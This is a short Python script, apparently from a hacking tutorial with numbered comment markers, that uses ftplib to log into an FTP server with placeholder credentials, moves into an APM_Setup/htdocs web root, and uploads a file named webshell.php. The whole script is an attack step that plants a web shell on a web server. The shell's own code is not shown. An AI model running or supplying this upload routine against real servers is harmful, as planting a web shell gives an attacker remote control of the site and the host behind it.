from ftplib import FTP

apacheDir = "htdocs"
serverName = "server"
serverID = "server"
serverPW = "server"

ftp = FTP(serverName, serverID, serverPW)       #(1)

ftp.cwd("APM_Setup/htdocs")                     #(2)

fp = open("webshell.php","rb")                  #(3)
ftp.storbinary("STOR webshell.php",fp)          #(4)

fp.close()
ftp.quit()
